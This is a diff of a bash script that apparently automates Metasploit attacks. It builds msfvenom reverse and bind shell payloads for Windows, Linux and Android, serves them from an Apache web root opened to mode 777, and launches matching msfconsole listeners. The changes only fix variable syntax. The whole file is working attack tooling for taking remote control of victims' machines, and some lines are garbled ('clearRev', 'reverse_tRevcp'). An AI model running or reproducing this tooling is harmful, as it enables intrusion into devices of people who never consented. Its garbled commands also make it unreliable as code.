@@ -50,63 +50,63 @@ fi
 #Skiping payload creation
 if [ $resp1 = 0 ]; then
 echo -e "$g Skipping the payload creation...$w"
-payChoice = 0
+paychoice=0
 #Windows - Powershell - Reverse_tcp
 elif [ $resp1 = 1 ] && [ $resp2 = 1 ]; then
   clear
   echo -e "$g Creating payload...$w"
   msfvenom -p windows/powershell_reverse_tcp LHOST=$(hostname -I) LPORT=4444 -f powershell > /var/www/html/power.bat
   echo "$done"
-  payChoice = 11
+  paychoice=11
 #Windows - Powershell - Bind_TCP
 elif [ $resp1 = 1 ] && [ $resp2 = 2 ]; then
   clear
   echo -e "$g Creating payload...$w"
   msfvenom -p windows/powershell_bind_tcp RHOST=$(hostname -I) LPORT=4444 -f powershell > /var/www/html/power.bat
   echo "$done"
-  payChoice = 12
+  paychoice=12
 #Windows - Shell - Reverse_tcp
 elif [ $resp1 = 1 ] && [ $resp2 = 3 ]; then
   clear
   echo -e "$g Creating payload...$w"
   msfvenom -p windows/shell/reverse_tcp LHOST=$(hostname -I) LPORT=4444 > /var/www/html/power.bat
   echo "$done"
-  payChoice = 13
+  paychoice=13
 #Windows - Shell - Bind_TCP
 elif [ $resp1 = 1 ] && [ $resp2 = 4 ]; then
   clear
   echo -e "$g Creating payload...$w"
   msfvenom -p windows/shell/reverse_tcp RHOST=$(hostname -I) LPORT=4444 > /var/www/html/power.bat
   echo "$done"
-  payChoice = 14
+  paychoice=14
 #Linux - Shell - Reverse_TCP
 elif [ $resp1 = 2 ] && [ $resp2 = 1 ]; then
   clear
   echo -e "$g Creating payload...$w"
   msfvenom -p linux/x86/shell/reverse_tcp LHOST=$(hostname -I) LPORT=4444 > /var/www/html/power.sh
   echo "$done"
-  payChoice = 21
+  paychoice=21
 #Linux - Shell - Bind_TCP
 elif [ $resp1 = 2 ] && [ $resp2 = 2 ]; then
   clear
   echo -e "$g Creating payload...$w"
   msfvenom -p linux/x86/shell/bind_tcp RHOST=$(hostname -I) LPORT=4444 > /var/www/html/power.sh
   echo "$done"
-  payChoice = 22
+  paychoice=22
 #Android - Meterpreter - Reverse_TCPRev
 elif [ $resp1 = 3 ] && [ $resp2 = 1 ]; then
   clearRev
   echo -e "$g Creating payload...$w"Rev
   msfvenom -p android/meterpreter/reverse_tRevcp LHOST=$(hostname -I) LPORT=4444 > /var/www/html/power.apk
   echo "$done"
-  payChoice = 31
+  paychoice=31
 #Android - Meterpreter - Bind_TCP
 elif [ $resp1 = 3 ] && [ $resp2 = 2 ]; then
   clear
   echo -e "$g Creating payload...$w"
   msfvenom -p android/meterpreter/bind_tcp RHOST=$(hostname -I) LPORT=4444 > /var/www/html/power.apk
   echo "$done"
-  payChoice = 32
+  paychoice=32
 else
   echo -e "$r error.$w"
 fi
@@ -116,34 +116,34 @@ chmod 777 -R /var/www/html/
 echo -e "$b Starting Apache2 service...$w"
 service apache2 restart
 echo -e "$b Apache2 successfuly restarted.$w"
-service apache2 status
+#service apache2 status
 
 echo -e "$g Starting the listener.. (this may take a while..)$w"
 cd rb
-if [ $payChoice = "0" ]; then
+if [ "$paychoice" = "0" ]; then
   exit 1
-elif [ $payChoice = "11" ]; then
+elif [ "$paychoice" = "11" ]; then
   cd windows
   msfconsole -r ListenWindowsPowerRevTCP.rb
-elif [ $payChoice = "12" ]; then
+elif [ "$paychoice" = "12" ]; then
   cd windows
   msfconsole -r ListenWindowsPowerBindTCP.rb
-elif [ $payChoice = "13" ]; then
+elif [ "$paychoice" = "13" ]; then
   cd windows
   msfconsole -r ListenWindowsShellRevTCP.rb
-elif [ $payChoice = "14" ]; then
+elif [ "$paychoice" = "14" ]; then
   cd windows
   msfconsole -r ListenWindowsShellBindTCP.rb
-elif [ $payChoice = "21" ]; then
+elif [ "$paychoice" = "21" ]; then
   cd linux
   msfconsole -r ListenLinuxShellRevTCP.rb
-elif [ $payChoice = "22" ]; then
+elif [ "$paychoice" = "22" ]; then
   cd linux
   msfconsole -r ListenLinuxShellBindTCP.rb
-elif [ $payChoice = "31" ]; then
+elif [ "$paychoice" = "31" ]; then
   cd android
   msfconsole -r ListenAndroRevTCP.rb
-elif [ $payChoice = "32" ]; then
+elif [ "$paychoice" = "32" ]; then
   cd android
   msfconsole -r ListenAndroBindTCP.rb
 fi
